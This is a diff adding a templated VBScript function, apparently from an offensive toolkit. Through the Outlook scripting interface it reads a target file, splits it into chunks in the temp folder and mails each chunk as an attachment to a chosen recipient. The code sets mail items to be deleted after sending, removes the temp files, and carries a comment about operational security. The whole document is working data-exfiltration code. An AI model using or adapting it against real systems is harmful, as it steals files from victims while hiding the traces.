@@ -1,0 +1,56 @@
+Function sendfile_mail()
+	on error resume next
+	Set sh = window.external.OutlookApplication.CreateObject("Wscript.Shell")
+
+	LF = Chr(10)
+	Set oFSO = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
+	FullName = {{ sourcefile }} 
+	TargetDir = sh.ExpandEnvironmentStrings("%TEMP%")
+	
+	Name = oFSO.GetTempName
+	SplitSize = {{ splitsize }}
+	Size = 1024 * 1024 * SplitSize
+
+	if oFSO.FileExists(FullName) then
+  		On Error Resume Next
+		Set iFile = oFSO.GetFile(FullName)
+  		Set iStream = iFile.OpenAsTextStream(1)
+  		
+  		data = iStream.Read(iFile.Size)
+  		iStream.close
+  
+  		Ext = 0
+  		offset = 1
+
+  		Do
+    		Ext = Right("00" & Ext + 1, 3)
+    		if ext > "999" then Error ("Too many files - maximum is 999!")
+
+    		NewName = TargetDir & Name & Ext
+    		Set oFile = oFSO.CreateTextFile(NewName, 2)
+
+			If Size > Len(data)+1 - offset Then Size = Len(data) + 1 - offset
+    
+    		oFile.Write Mid(Data, offset, Size)
+    		offset = offset + Size
+    		oFile.Close
+
+			Set objMail = window.external.OutlookApplication.CreateItem(0)
+			objMail.to = {{ recipient }}
+			
+			objMail.Subject = "Part" & Ext
+			objMail.Body = Ext
+			objMail.Attachments.Add(NewName)
+			objMail.DeleteAfterSubmit = True
+			SendDate = Now()
+			SendDate = DateAdd("n",{{ send_interval_minutes }},SendDate)
+			objMail.DeferredDeliveryTime  = SendDate 'Not in use. Queues up in Outbox - Not very opsec
+			objMail.Send
+			oFSO.DeleteFile(NewName)
+
+  		Loop Until offset >= Len(data)
+		sendfile_mail = "Sent " & Ext & " mails to " & {{ recipient }} & " with files as basename: " & Name
+	else
+		sendfile_mail = "Error - SourceFile not found or some other strange error"
+	end if
+End Function
